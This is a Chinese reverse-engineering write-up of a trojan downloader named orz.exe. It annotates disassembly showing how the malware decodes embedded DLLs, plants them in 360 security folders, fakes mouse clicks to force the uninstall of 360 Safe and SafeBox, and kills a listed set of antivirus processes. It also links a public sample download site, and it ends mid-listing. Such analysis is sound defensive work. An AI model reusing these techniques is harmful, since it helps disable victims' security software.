

# 猫癣（牛）病毒 主程序 orz.exe 分析

> 原文：[`www.pediy.com/kssd/pediy10/83016.html`](https://www.pediy.com/kssd/pediy10/83016.html)

从挂马简报里的被挂马的网站获得病毒样本..发现被挂都是同一个下载者..然后我对主程序就简要的  
  
分析了下.. 发现是猫癣 不过这个也之前我分析的猫癣有些差异..  
  
分析得到下载地址..然后又得到好多样本..多是游戏木马..哈哈..这下发了  
  
样本下载 http://yben.ys168.com/  
1 找到本进程的父进程..  
实现:利用 GetCurrentProcessId 得到本进程的 ID 在用 Process32First 与 Process32Next 与 ID 比较 相等了,通过结构体获得父进程 ID  
{  
00415CA6   |.  56             push esi  
00415CA7   |.  57             push edi  
00415CA8   |.  33C0           xor eax,eax  
00415CAA   |.  B9 49000000    mov ecx,49  
00415CAF   |.  8D7C24 0C      lea edi,dword ptr ss:\[esp+C\]  
00415CB3   |.  C74424 08 0000>mov dword ptr ss:\[esp+8\],0  
00415CBB   |.  50             push eax                                  ; /ProcessID => 0  
00415CBC   |.  6A 02          push 2                                    ; |Flags = TH32CS\_SNAPPROCESS  
00415CBE   |.  F3:AB          rep stos dword ptr es:\[edi\]               ; |  
00415CC0   |.  E8 37060000    call orz18.004162FC                       ; \\CreateToolhelp32Snapshot  
00415CC5   |.  8BF0           mov esi,eax  
00415CC7   |.  83FE FF        cmp esi,-1  
00415CCA   |.  75 0B          jnz short orz18.00415CD7  
00415CCC   |.  5F             pop edi  
00415CCD   |.  33C0           xor eax,eax  
00415CCF   |.  5E             pop esi  
00415CD0   |.  81C4 28010000  add esp,128  
00415CD6   |.  C3             retn  
00415CD7   |>  8D4424 08      lea eax,dword ptr ss:\[esp+8\]  
00415CDB   |.  C74424 08 2801>mov dword ptr ss:\[esp+8\],128  
00415CE3   |.  50             push eax                                  ; /pProcessentry  
00415CE4   |.  56             push esi                                  ; |hSnapshot  
00415CE5   |.  E8 0C060000    call orz18.004162F6                       ; \\Process32First  
00415CEA   |.  85C0           test eax,eax  
00415CEC   |.  74 21          je short orz18.00415D0F  
00415CEE   |.  8B3D 5C104000  mov edi,dword ptr ds:\[40105C\]             ;  kernel32.GetCurrentProcessId  
00415CF4   |.  FFD7           call edi                                  ; \[GetCurrentProcessId  
00415CF6   |.  394424 10      cmp dword ptr ss:\[esp+10\],eax  
00415CFA   |.  74 13          je short orz18.00415D0F  
00415CFC   |>  8D4C24 08      /lea ecx,dword ptr ss:\[esp+8\]  
00415D00   |.  51             |push ecx                                 ; /pProcessentry  
00415D01   |.  56             |push esi                                 ; |hSnapshot  
00415D02   |.  E8 E9050000    |call orz18.004162F0                      ; \\Process32Next  
00415D07   |.  FFD7           |call edi  
00415D09   |.  394424 10      |cmp dword ptr ss:\[esp+10\],eax  
00415D0D   |.^ 75 ED          \\jnz short orz18.00415CFC  
00415D0F   |>  8B4424 20      mov eax,dword ptr ss:\[esp+20\]  
00415D13   |.  5F             pop edi  
00415D14   |.  5E             pop esi  
00415D15   |.  81C4 28010000  add esp,128  
00415D1B   \\.  C3             retn  
}  
2 创建 CreateMutexA 对象 判断创建的互斥体是否名为"oioipuy"，若此互斥变量存在，则退出进程；  
{  
004161AE   |> \\68 F8434100    push orz18.004143F8                       ; /MutexName = "oioipuy"  
004161B3   |.  6A 01          push 1                                    ; |InitialOwner = TRUE  
004161B5   |.  56             push esi                                  ; |pSecurity  
004161B6   |.  FF15 74104000  call dword ptr ds:\[401074\]                ; \\CreateMutexA  
004161BC   |.  FF15 70104000  call dword ptr ds:\[401070\]                ;  ntdll.RtlGetLastWin32Error  
}  
3 在 C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\创建文件 1696,创建之前先内存中还原 1696  
  
1696 文件数据在内存中还原  
{  
00416170     33C0             xor eax,eax  
00416172     B1 07            mov cl,7  
00416174     8A90 24D74000    mov dl,byte ptr ds:\[eax+40D724\]-->指向内存缓冲区 0040D704  
0041617A     32D1             xor dl,cl  
0041617C     8890 24D74000    mov byte ptr ds:\[eax+40D724\],dl  
00416182     40               inc eax  
00416183     3D 802A0000      cmp eax,2A80  
00416188   ^ 7C EA            jl short orz18.00416174  
}  
4 在 1696 文件头部加 MZ  
{  
00416136     FF15 A0104000    call dword ptr ds:\[4010A0\]       ; kernel32.CreateFileA  
0041613C     56               push esi  
0041613D     8BF8             mov edi,eax  
0041613F     56               push esi  
00416140     56               push esi  
00416141     57               push edi  
00416142     FF15 60104000    call dword ptr ds:\[401060\]       ; kernel32.SetFilePointer  
00416148     8D45 08          lea eax,dword ptr ss:\[ebp+8\]  
0041614B     56               push esi  
0041614C     50               push eax  
0041614D     6A 02            push 2  
0041614F     68 74434100      push orz18.00414374              ; ASCII "MZ"  
00416154     57               push edi  
00416155     FF15 A4104000    call dword ptr ds:\[4010A4\]       ; kernel32.WriteFile  
0041615B     57               push edi  
0041615C     FF15 AC104000    call dword ptr ds:\[4010AC\]       ; kernel32.CloseHandle  
}  
004158A7     68 30D54000      push orz18.0040D530              ; ASCII "safeboxTray.exe"  
5 在内存中把 safeboxTray.exe 360tray.exe usp10.dll /u. 还原出来  
还原过程 00414960  
{  
0041498A   |> /8A0C32         /mov cl,byte ptr ds:\[edx+esi\]  
0041498D   |. |8AC2           |mov al,dl  
0041498F   |. |2C 3B          |sub al,3B  
00414991   |. |8BFE           |mov edi,esi  
00414993   |. |D0E0           |shl al,1  
00414995   |. |02C8           |add cl,al  
00414997   |. |33C0           |xor eax,eax  
00414999   |. |880C32         |mov byte ptr ds:\[edx+esi\],cl  
0041499C   |. |83C9 FF        |or ecx,FFFFFFFF  
0041499F   |. |42             |inc edx  
004149A0   |. |F2:AE          |repne scas byte ptr es:\[edi\]  
004149A2   |. |F7D1           |not ecx  
004149A4   |. |49             |dec ecx  
004149A5   |. |3BD1           |cmp edx,ecx  
004149A7   |.^\\72 E1          \\jb short orz18.0041498A  
}  
6 在进程中查找 safeboxTray.exe,找到之后打开该进程,在用 EnumProcessModules  GetModuleFileNameExA   
得到路径 C:\\Program Files\\360\\360safebox\\SafeBoxtray.exe  
  
7 替换文件,然后把 rptup.dll 在内存里数据还原,在创建 C:\\Program Files\\360\\360safebox\\rptup.dll  
实现 : MoveFileExA(C:\\Program Files\\360\\360safebox\\rptup.dll,新 C:\\Program Files\\360\\360safebox\\libspyerps.dat")  
  
  
00415ACA   |.  E8 F1EDFFFF    call orz18.004148C0  
  
{  
      rptup.dll 在内存里数据还原  
      {  
      004148A4   |> /8A90 30114000  /mov dl,byte ptr ds:\[eax+401130\]  
      004148AA   |. |32D1           |xor dl,cl  
      004148AC   |. |8890 30114000  |mov byte ptr ds:\[eax+401130\],dl  
      004148B2   |. |40             |inc eax  
      004148B3   |. |3D 00C40000    |cmp eax,0C400  
      004148B8   |.^\\7C EA          \\jl short orz18.004148A4  
      }  
        
 }  
 8 创建 C:\\Program Files\\360\\360safebox\\usp10.dll  
   
 9 创建一个进程 执行 C:\\Program Files\\360\\360safebox\\SafeBoxtray.exe /u,然后弹出 360 保险箱卸  
 模拟鼠标点击  
 {  
 004153B6   |.  56             push esi  
004153B7   |.  57             push edi  
004153B8   |.  FF15 F8104000  call dword ptr ds:\[4010F8\]          ; \[\\\\ GetForegroundWindow 返回前台窗口  
004153BE   |.  8BF0           mov esi,eax  
004153C0   |.  B9 40000000    mov ecx,40  
004153C5   |.  33C0           xor eax,eax  
004153C7   |.  8D7C24 21      lea edi,dword ptr ss:\[esp+21\]  
004153CB   |.  C64424 20 00   mov byte ptr ss:\[esp+20\],0  
004153D0   |.  68 04010000    push 104                            ; /Count = 104 (260.)  
004153D5   |.  F3:AB          rep stos dword ptr es:\[edi\]         ; |  
004153D7   |.  66:AB          stos word ptr es:\[edi\]              ; |  
004153D9   |.  AA             stos byte ptr es:\[edi\]              ; |  
004153DA   |.  8D4424 24      lea eax,dword ptr ss:\[esp+24\]       ; |  
004153DE   |.  50             push eax                            ; |Buffer  
004153DF   |.  56             push esi                            ; |hWnd  
004153E0   |.  FF15 20114000  call dword ptr ds:\[401120\]          ; \\GetWindowTextA  
004153E6   |.  8D4C24 08      lea ecx,dword ptr ss:\[esp+8\]  
004153EA   |.  51             push ecx                            ; /pPoint  
004153EB   |.  FF15 14114000  call dword ptr ds:\[401114\]          ; \\GetCursorPos  
004153F1   |.  8D5424 20      lea edx,dword ptr ss:\[esp+20\]  
004153F5   |.  68 50D54000    push orz18.0040D550                 ; /s2 = "360 保险箱提示"  
004153FA   |.  52             push edx                            ; |s1  
004153FB   |.  E8 300F0000    call orz18.00416330                 ; \\\_stricmp  
00415400   |.  83C4 08        add esp,8  
00415403   |.  85C0           test eax,eax  
00415405   |.  75 68          jnz short orz18.0041546F  
00415407   |.  53             push ebx  
00415408   |.  8D4424 14      lea eax,dword ptr ss:\[esp+14\]  
0041540C   |.  55             push ebp  
0041540D   |.  50             push eax                            ; /pRect  
0041540E   |.  56             push esi                            ; |hWnd  
0041540F   |.  FF15 FC104000  call dword ptr ds:\[4010FC\]          ; \\\\\\ \\\\GetWindowRect 窗口的边框矩形的尺寸  
00415415   |.  8B5424 1C      mov edx,dword ptr ss:\[esp+1C\]  
00415419   |.  8B4C24 20      mov ecx,dword ptr ss:\[esp+20\]  
0041541D   |.  8B1D F4104000  mov ebx,dword ptr ds:\[4010F4\]       ;  USER32.SetCursorPos  
00415423   |.  8DBA BE000000  lea edi,dword ptr ds:\[edx+BE\]  
00415429   |.  8DB1 1AFFFFFF  lea esi,dword ptr ds:\[ecx-E6\]  
0041542F   |.  57             push edi                            ; /Y  
00415430   |.  56             push esi                            ; |X  
00415431   |.  FFD3           call ebx                            ; \\SetCursorPos  
00415433   |.  8B2D F0104000  mov ebp,dword ptr ds:\[4010F0\]       ;  USER32.mouse\_event  
00415439   |.  6A 00          push 0                              ; /ExtraInfo = 0  
0041543B   |.  6A 00          push 0                              ; |Reserved = 0  
0041543D   |.  57             push edi                            ; |dY  
0041543E   |.  56             push esi                            ; |dX  
0041543F   |.  68 02800000    push 8002                           ; |Flags = MOUSEEVENTF\_LEFTDOWN|MOUSEEVENTF\_ABSOLUTE  
00415444   |.  FFD5           call ebp                            ; \\mouse\_event  
00415446   |.  6A 00          push 0                              ; /ExtraInfo = 0  
00415448   |.  6A 00          push 0                              ; |Reserved = 0  
0041544A   |.  57             push edi                            ; |dY  
0041544B   |.  56             push esi                            ; |dX  
0041544C   |.  68 04800000    push 8004                           ; |Flags = MOUSEEVENTF\_LEFTUP|MOUSEEVENTF\_ABSOLUTE  
00415451   |.  FFD5           call ebp                            ; \\mouse\_event  
00415453   |.  8B4424 14      mov eax,dword ptr ss:\[esp+14\]  
00415457   |.  8B4C24 10      mov ecx,dword ptr ss:\[esp+10\]  
0041545B   |.  50             push eax                            ; /Y  
0041545C   |.  51             push ecx                            ; |X  
0041545D   |.  FFD3           call ebx                            ; \\SetCursorPos  
0041545F   |.  5D             pop ebp  
00415460   |.  5B             pop ebx                             ;  USER32.SetCursorPos  
00415461   |.  5F             pop edi  
00415462   |.  B8 01000000    mov eax,1  
00415467   |.  5E             pop esi  
00415468   |.  81C4 1C010000  add esp,11C  
0041546E   |.  C3             retn  
  
 }  
 10 结束进程 safeboxTray.exe 360tray.exe  
 00415B28   |> \\E8 13FBFFFF    call orz18.00415640  
  
{  
00415671   |.  55             push ebp  
00415672   |.  50             push eax                            ; /pProcessentry  
00415673   |.  56             push esi                            ; |hSnapshot  
00415674   |.  C74424 18 2801>mov dword ptr ss:\[esp+18\],128       ; |  
0041567C   |.  E8 750C0000    call orz18.004162F6                 ; \\Process32First  
00415681   |.  8B2D AC104000  mov ebp,dword ptr ds:\[4010AC\]       ;  kernel32.CloseHandle  
00415687   |.  85C0           test eax,eax  
00415689   |.  0F84 84000000  je orz18.00415713  
0041568F   |.  53             push ebx  
00415690   |.  8B1D 24114000  mov ebx,dword ptr ds:\[401124\]       ;  USER32.MessageBoxA  
00415696   |.  57             push edi  
00415697   |.  8B3D 88104000  mov edi,dword ptr ds:\[401088\]       ;  kernel32.Sleep  
0041569D   |>  8D4C24 3C      /lea ecx,dword ptr ss:\[esp+3C\]  
004156A1   |.  68 30D54000    |push orz18.0040D530                ; /String2 = "safeboxTray.exe"  
004156A6   |.  51             |push ecx                           ; |String1  
004156A7   |.  FF15 40104000  |call dword ptr ds:\[401040\]         ; \\lstrcmpiA  
004156AD   |.  85C0           |test eax,eax  
004156AF   |.  74 14          |je short orz18.004156C5  
004156B1   |.  8D5424 3C      |lea edx,dword ptr ss:\[esp+3C\]  
004156B5   |.  68 40D54000    |push orz18.0040D540                ; /String2 = "360tray.exe"  
004156BA   |.  52             |push edx                           ; |String1  
004156BB   |.  FF15 40104000  |call dword ptr ds:\[401040\]         ; \\lstrcmpiA  
004156C1   |.  85C0           |test eax,eax  
004156C3   |.  75 3D          |jnz short orz18.00415702  
004156C5   |>  8B4424 20      |mov eax,dword ptr ss:\[esp+20\]  
004156C9   |.  50             |push eax                           ; /ProcessId  
004156CA   |.  6A 00          |push 0                             ; |Inheritable = FALSE  
004156CC   |.  6A 01          |push 1                             ; |Access = TERMINATE  
004156CE   |.  FF15 98104000  |call dword ptr ds:\[401098\]         ; \\OpenProcess  
004156D4   |.  8BF0           |mov esi,eax  
004156D6   |.  85F6           |test esi,esi  
004156D8   |.  74 0D          |je short orz18.004156E7  
004156DA   |.  6A 00          |push 0                             ; /ExitCode = 0  
004156DC   |.  56             |push esi                           ; |hProcess  
004156DD   |.  FF15 9C104000  |call dword ptr ds:\[40109C\]         ; \\TerminateProcess  
004156E3   |.  894424 10      |mov dword ptr ss:\[esp+10\],eax  
004156E7   |>  56             |push esi  
004156E8   |.  FFD5           |call ebp                            //CloseHandle  
004156EA   |.  6A 0A          |push 0A  
004156EC   |.  FFD7           |call edi                            //sleep  
004156EE   |.  6A 00          |push 0  
004156F0   |.  68 58664100    |push orz18.00416658  
004156F5   |.  68 58664100    |push orz18.00416658  
004156FA   |.  6A FF          |push -1  
004156FC   |.  FFD3           |call ebx  
004156FE   |.  8B7424 14      |mov esi,dword ptr ss:\[esp+14\]  
00415702   |>  8D4C24 18      |lea ecx,dword ptr ss:\[esp+18\]  
00415706   |.  51             |push ecx                           ; /pProcessentry  
00415707   |.  56             |push esi                           ; |hSnapshot  
00415708   |.  E8 E30B0000    |call orz18.004162F0                ; \\Process32Next  
0041570D   |.  85C0           |test eax,eax  
0041570F   |.^ 75 8C          \\jnz short orz18.0041569D  
00415711   |.  5F             pop edi  
00415712   |.  5B             pop ebx  
00415713   |>  56             push esi  
00415714   |.  FFD5           call ebp                           //CloseHandle  
00415716   |.  8B4424 08      mov eax,dword ptr ss:\[esp+8\]  
0041571A   |.  5D             pop ebp  
0041571B   |.  5E             pop esi  
0041571C   |.  81C4 30010000  add esp,130  
00415722   \\.  C3             retn  
}  
11 在进程中查找 360tray.exe,找到之后打开该进程,在用 EnumProcessModules  GetModuleFileNameExA ,  
得到路径 C:\\Program Files\\360\\360Safe\\safemon\\360tray.exe,由这个路径得到 C:\\Program Files\\360\\360Safe\\+++deepscan\\uninst.exe  
  
CopyFileA(C:\\Program Files\\360\\360Safe\\uninst.exe,新 C:\\Program Files\\360\\360Safe\\+++deepscan\\uninst.exe)  
{  
0041506E   |.  50             push eax                                             ; |NewFileName  
0041506F   |.  F3:A4          rep movs byte ptr es:\[edi\],byte ptr ds:\[esi\]         ; |  
00415071   |.  8D8C24 4C02000>lea ecx,dword ptr ss:\[esp+24C\]                       ; |  
00415078   |.  51             push ecx                                             ; |ExistingFileName  
00415079   |.  FF15 3C104000  call dword ptr ds:\[40103C\]                           ; \\CopyFileA  
}  
12 创建 C:\\Program Files\\360\\360Safe\\deepscan\\usp10.dll  
实现:  
数据还原  
{  
004148A4   |> /8A90 30114000  /mov dl,byte ptr ds:\[eax+401130\]  
004148AA   |. |32D1           |xor dl,cl  
004148AC   |. |8890 30114000  |mov byte ptr ds:\[eax+401130\],dl  
004148B2   |. |40             |inc eax  
004148B3   |. |3D 00C40000    |cmp eax,0C400  
004148B8   |.^\\7C EA          \\jl short orz18.004148A4  
  
}  
  
关键 00415B2D   |.  E8 EEF2FFFF    call orz18.00414E20  
  
00415100   |.  FF15 34104000  call dword ptr ds:\[401034\]                           ; \\CreateThread  
  
  
  
  
13 创建一个线程  
  
004150E9   |.  6A 0A          push 0A                                              ; /Timeout = 10. ms  
004150EB   |.  FF15 88104000  call dword ptr ds:\[401088\]                           ; \\Sleep  
004150F1   |.  6A 00          push 0                                               ; /pThreadId = NULL  
004150F3   |.  6A 00          push 0                                               ; |CreationFlags = 0  
004150F5   |.  6A 00          push 0                                               ; |pThreadParm = NULL  
004150F7   |.  68 304D4100    push orz18.00414D30                                  ; |ThreadFunction = orz18.00414D30  
004150FC   |.  6A 00          push 0                                               ; |StackSize = 0  
004150FE   |.  6A 00          push 0                                               ; |pSecurity = NULL  
00415100   |.  FF15 34104000  call dword ptr ds:\[401034\]                           ; \\CreateThread  
00415106   |.  8D4424 18      lea eax,dword ptr ss:\[esp+18\]  
0041510A   |.  50             push eax                                             ; /Arg1  
0041510B   |.  E8 80FCFFFF    call orz18.00414D90                                  ; \\orz18.00414D90  
线程函数  
{  
发消息卸载 呵呵  
{  
00414A70   /$  56             push esi  
00414A71   |.  68 8CD54000    push orz18.0040D58C                 ; /Title = "360 安全卫士"  
00414A76   |.  68 A0D54000    push orz18.0040D5A0                 ; |Class = "#32770"  
00414A7B   |.  FF15 28114000  call dword ptr ds:\[401128\]          ; \\FindWindowA  
00414A81   |.  85C0           test eax,eax  
00414A83   |.  74 60          je short orz18.00414AE5  
00414A85   |.  68 A8D54000    push orz18.0040D5A8                 ; /Title = "是"  
00414A8A   |.  68 98D54000    push orz18.0040D598                 ; |Class = "Button"  
00414A8F   |.  6A 00          push 0                              ; |hAfterWnd = NULL  
00414A91   |.  50             push eax                            ; |hParent  
00414A92   |.  FF15 08114000  call dword ptr ds:\[401108\]          ; \\FindWindowExA  
00414A98   |.  8BF0           mov esi,eax  
00414A9A   |.  85F6           test esi,esi  
00414A9C   |.  74 47          je short orz18.00414AE5  
00414A9E   |.  57             push edi  
00414A9F   |.  8B3D 0C114000  mov edi,dword ptr ds:\[40110C\]       ;  USER32.SendMessageA  
00414AA5   |.  6A 00          push 0                              ; /lParam = 0  
00414AA7   |.  6A 00          push 0                              ; |wParam = 0  
00414AA9   |.  68 01020000    push 201                            ; |Message = WM\_LBUTTONDOWN  
00414AAE   |.  56             push esi                            ; |hWnd  
00414AAF   |.  FFD7           call edi                            ; \\SendMessageA  
00414AB1   |.  6A 00          push 0                              ; /lParam = 0  
00414AB3   |.  6A 00          push 0                              ; |wParam = 0  
00414AB5   |.  68 02020000    push 202                            ; |Message = WM\_LBUTTONUP  
00414ABA   |.  56             push esi                            ; |hWnd  
00414ABB   |.  FFD7           call edi                            ; \\SendMessageA  
00414ABD   |.  6A 0A          push 0A                             ; /Timeout = 10. ms  
00414ABF   |.  FF15 88104000  call dword ptr ds:\[401088\]          ; \\Sleep  
00414AC5   |.  6A 00          push 0                              ; /lParam = 0  
00414AC7   |.  6A 00          push 0                              ; |wParam = 0  
00414AC9   |.  68 01020000    push 201                            ; |Message = WM\_LBUTTONDOWN  
00414ACE   |.  56             push esi                            ; |hWnd  
00414ACF   |.  FFD7           call edi                            ; \\SendMessageA  
00414AD1   |.  6A 00          push 0                              ; /lParam = 0  
00414AD3   |.  6A 00          push 0                              ; |wParam = 0  
00414AD5   |.  68 02020000    push 202                            ; |Message = WM\_LBUTTONUP  
00414ADA   |.  56             push esi                            ; |hWnd  
00414ADB   |.  FFD7           call edi                            ; \\SendMessageA  
00414ADD   |.  5F             pop edi  
00414ADE   |.  B8 01000000    mov eax,1  
00414AE3   |.  5E             pop esi  
00414AE4   |.  C3             retn  
00414AE5   |>  33C0           xor eax,eax  
00414AE7   |.  5E             pop esi  
00414AE8   \\.  C3             retn  
  
  
}  
}  
14 创建一个进程执行 C:\\Program Files\\360\\360Safe\\deepscan\\uninst.exe  \_?=C:\\D  
0041510B   |.  E8 80FCFFFF            
{  
00414D90   /$  83EC 54        sub esp,54  
00414D93   |.  33C0           xor eax,eax  
00414D95   |.  57             push edi  
00414D96   |.  894424 08      mov dword ptr ss:\[esp+8\],eax  
00414D9A   |.  B9 10000000    mov ecx,10  
00414D9F   |.  894424 0C      mov dword ptr ss:\[esp+C\],eax  
00414DA3   |.  8D7C24 18      lea edi,dword ptr ss:\[esp+18\]  
00414DA7   |.  F3:AB          rep stos dword ptr es:\[edi\]  
00414DA9   |.  8D4C24 04      lea ecx,dword ptr ss:\[esp+4\]  
00414DAD   |.  8D5424 14      lea edx,dword ptr ss:\[esp+14\]  
00414DB1   |.  51             push ecx                                             ; /pProcessInfo  
00414DB2   |.  52             push edx                                             ; |pStartupInfo  
00414DB3   |.  50             push eax                                             ; |CurrentDir => NULL  
00414DB4   |.  50             push eax                                             ; |pEnvironment => NULL  
00414DB5   |.  50             push eax                                             ; |CreationFlags => 0  
00414DB6   |.  50             push eax                                             ; |InheritHandles => FALSE  
00414DB7   |.  50             push eax                                             ; |pThreadSecurity => NULL  
00414DB8   |.  894424 2C      mov dword ptr ss:\[esp+2C\],eax                        ; |  
00414DBC   |.  66:894424 60   mov word ptr ss:\[esp+60\],ax                          ; |  
00414DC1   |.  50             push eax                                             ; |pProcessSecurity => NULL  
00414DC2   |.  8B4424 7C      mov eax,dword ptr ss:\[esp+7C\]                        ; |  
00414DC6   |.  C74424 24 0000>mov dword ptr ss:\[esp+24\],0                          ; |  
00414DCE   |.  50             push eax                                             ; |CommandLine  
00414DCF   |.  6A 00          push 0                                               ; |ModuleFileName = NULL  
00414DD1   |.  C74424 3C 4400>mov dword ptr ss:\[esp+3C\],44                         ; |  
00414DD9   |.  C74424 68 0100>mov dword ptr ss:\[esp+68\],1                          ; |  
00414DE1   |.  FF15 38104000  call dword ptr ds:\[401038\]                           ; \\CreateProcessA  
00414DE7   |.  6A FF          push -1                                              ; /Timeout = INFINITE  
00414DE9   |.  8B4C24 08      mov ecx,dword ptr ss:\[esp+8\]                         ; |  
00414DED   |.  51             push ecx                                             ; |hProcess  
00414DEE   |.  FF15 04114000  call dword ptr ds:\[401104\]                           ; \\WaitForInputIdle  
00414DF4   |.  6A 00          push 0                                               ; /pThreadId = NULL  
00414DF6   |.  6A 00          push 0                                               ; |CreationFlags = 0  
00414DF8   |.  6A 00          push 0                                               ; |pThreadParm = NULL  
00414DFA   |.  68 F0494100    push orz18.004149F0                                  ; |ThreadFunction = orz18.004149F0  
00414DFF   |.  6A 00          push 0                                               ; |StackSize = 0  
00414E01   |.  6A 00          push 0                                               ; |pSecurity = NULL  
00414E03   |.  FF15 34104000  call dword ptr ds:\[401034\]                           ; \\CreateThread  
00414E09   |.  33C0           xor eax,eax  
00414E0B   |.  5F             pop edi  
00414E0C   |.  83C4 54        add esp,54  
00414E0F   \\.  C2 0400        retn 4  
  
}  
  
15 卸了之后有创建一条线程 删除 C:\\Program Files\\360\\360Safe\\deepscan\\usp10.dll  
  
  
线程 004149F0  
{  
004149F0    .  53             push ebx  
004149F1    .  56             push esi  
004149F2    .  8B35 88104000  mov esi,dword ptr ds:\[401088\]                    ;  kernel32.Sleep  
004149F8    .  57             push edi  
004149F9    .  8B3D 7C104000  mov edi,dword ptr ds:\[40107C\]                    ;  kernel32.DeleteFileA  
004149FF    .  33DB           xor ebx,ebx  
00414A01    >  68 2C010000    push 12C  
00414A06    .  FFD6           call esi  
00414A08    .  68 54654100    push orz18.00416554                              ;  ASCII "C:\\Program Files\\360\\360Safe\\deepscan\\usp10.dll"  
00414A0D    .  FFD7           call edi  
00414A0F    .  85C0           test eax,eax  
00414A11    .  75 0D          jnz short orz18.00414A20  
00414A13    .  43             inc ebx  
00414A14    .  81FB 96000000  cmp ebx,96  
00414A1A    .^ 7C E5          jl short orz18.00414A01  
00414A1C    .  5F             pop edi  
00414A1D    .  5E             pop esi  
00414A1E    .  5B             pop ebx  
}  
16 删除 C:\\Program Files\\360\\360safebox\\usp10.dll C:\\Program Files\\360\\360safebox\\rptup.dll  
   用 rptup.dll 替换 libspyerps.dat  
00415B3C   |.  50             push eax                   ; /C:\\Program Files\\360\\360safebox\\usp10.dll  
00415B3D   |.  FFD6           call esi                   ; \\DeleteFileA  
00415B3F   |.  8D4C24 78      lea ecx,dword ptr ss:\[esp+>  
00415B43   |.  51             push ecx                   ; /C:\\Program Files\\360\\360safebox\\rptup.dll  
00415B44   |.  FFD6           call esi                   ; \\DeleteFileA  
00415B46   |.  8D5424 78      lea edx,dword ptr ss:\[esp+>  
00415B4A   |.  6A 01          push 1                     ; /Flags = REPLACE\_EXISTING  
00415B4C   |.  8D8424 8001000>lea eax,dword ptr ss:\[esp+>; |  
00415B53   |.  52             push edx                   ; |C:\\Program Files\\360\\360safebox\\rptup.dll  
00415B54   |.  50             push eax                   ; |ExistingFileExA C:\\Program Files\\360\\360safebox\\libspyerps.dat  
00415B55   |.  FF15 50104000  call dword ptr ds:\[401050\] ; \\MoveFileExA  
  
17 查杀进程  
  
 kavstart.exe.kissvc.exe.kmailmon.exe.kpfw32.exe.kpfwsvc.exe.kwatch.exe.ccenter.exe.ras.exe.  
 rstray.exe.rsagent.exe..ravtask.exe.ravstub.exe.ravmon.exe.ravmond.exe.avp.exe.360safebox.exe.  
 360Safe.exe.Thunder5.exe.rfwmain.exe.rfwstub.exe.rfwsrv.exe..  
{  
00415EC0   /$  81EC 30010000  sub esp,130  
00415EC6   |.  56             push esi  
00415EC7   |.  6A 00          push 0                                    ; /ProcessID = 0  
00415EC9   |.  6A 02          push 2                                    ; |Flags = TH32CS\_SNAPPROCESS  
00415ECB   |.  C64424 0F 00   mov byte ptr ss:\[esp+F\],0                 ; |  
00415ED0   |.  E8 27040000    call orz18.004162FC                       ; \\CreateToolhelp32Snapshot  
00415ED5   |.  8BF0           mov esi,eax  
00415ED7   |.  83FE FF        cmp esi,-1  
00415EDA   |.  897424 08      mov dword ptr ss:\[esp+8\],esi  
00415EDE   |.  75 0A          jnz short orz18.00415EEA  
00415EE0   |.  32C0           xor al,al  
00415EE2   |.  5E             pop esi  
00415EE3   |.  81C4 30010000  add esp,130  
00415EE9   |.  C3             retn  
00415EEA   |>  8D4424 0C      lea eax,dword ptr ss:\[esp+C\]  
00415EEE   |.  C74424 0C 2801>mov dword ptr ss:\[esp+C\],128  
00415EF6   |.  50             push eax                                  ; /pProcessentry  
00415EF7   |.  56             push esi                                  ; |hSnapshot  
00415EF8   |.  E8 F9030000    call orz18.004162F6                       ; \\Process32First  
00415EFD   |.  85C0           test eax,eax  
00415EFF   |.  0F84 B0000000  je orz18.00415FB5  
00415F05   |.  53             push ebx  
00415F06   |.  8B1D 98104000  mov ebx,dword ptr ds:\[401098\]             ;  kernel32.OpenProcess  
00415F0C   |.  55             push ebp  
00415F0D   |.  57             push edi  
00415F0E   |>  33ED           /xor ebp,ebp  
00415F10   |>  8BCD           |/mov ecx,ebp  
00415F12   |.  33C0           ||xor eax,eax  
00415F14   |.  C1E1 04        ||shl ecx,4  
00415F17   |.  8DB429 ACD5400>||lea esi,dword ptr ds:\[ecx+ebp+40D5AC\]  
00415F1E   |.  83C9 FF        ||or ecx,FFFFFFFF  
00415F21   |.  8BFE           ||mov edi,esi  
00415F23   |.  F2:AE          ||repne scas byte ptr es:\[edi\]  
00415F25   |.  F7D1           ||not ecx  
00415F27   |.  49             ||dec ecx  
00415F28   |.  83F9 04        ||cmp ecx,4  
00415F2B   |.  72 56          ||jb short orz18.00415F83  
00415F2D   |.  A0 22D74000    ||mov al,byte ptr ds:\[40D722\]  
00415F32   |.  84C0           ||test al,al  
00415F34   |.  74 09          ||je short orz18.00415F3F  
00415F36   |.  56             ||push esi  
00415F37   |.  E8 E4FDFFFF    ||call orz18.00415D20                     ;  //还原数据 要杀的进程  
00415F3C   |.  83C4 04        ||add esp,4  
00415F3F   |>  8D5424 3C      ||lea edx,dword ptr ss:\[esp+3C\]  
00415F43   |.  56             ||push esi                                ; /String2  
00415F44   |.  52             ||push edx                                ; |String1  
00415F45   |.  FF15 40104000  ||call dword ptr ds:\[401040\]              ; \\lstrcmpiA  
00415F4B   |.  85C0           ||test eax,eax  
00415F4D   |.  75 34          ||jnz short orz18.00415F83  
00415F4F   |.  83FD 11        ||cmp ebp,11  
00415F52   |.  75 37          ||jnz short orz18.00415F8B  
00415F54   |.  8B4424 20      ||mov eax,dword ptr ss:\[esp+20\]  
00415F58   |.  50             ||push eax  
00415F59   |.  6A 00          ||push 0  
00415F5B   |.  6A 01          ||push 1  
00415F5D   |.  FFD3           ||call ebx  
00415F5F   |.  6A 00          ||push 0                                  ; /Style = MB\_OK|MB\_APPLMODAL  
00415F61   |.  6A 00          ||push 0                                  ; |Title = NULL  
00415F63   |.  6A 00          ||push 0                                  ; |Text = NULL  
00415F65   |.  6A FD          ||push -3                                 ; |hOwner = FFFFFFFD  
00415F67   |.  8BF0           ||mov esi,eax                             ; |  
00415F69   |.  FF15 24114000  ||call dword ptr ds:\[401124\]              ; \\MessageBoxA  
00415F6F   |.  85F6           ||test esi,esi  
00415F71   |.  74 18          ||je short orz18.00415F8B  
00415F73   |.  6A 00          ||push 0                                  ; /ExitCode = 0  
00415F75   |.  56             ||push esi                                ; |hProcess  
00415F76   |.  FF15 9C104000  ||call dword ptr ds:\[40109C\]              ; \\TerminateProcess  
00415F7C   |.  56             ||push esi                                ; /hObject  
00415F7D   |.  FF15 AC104000  ||call dword ptr ds:\[4010AC\]              ; \\CloseHandle  
00415F83   |>  45             ||inc ebp  
00415F84   |.  83FD 16        ||cmp ebp,16  
00415F87   |.^ 7C 87          |\\jl short orz18.00415F10  
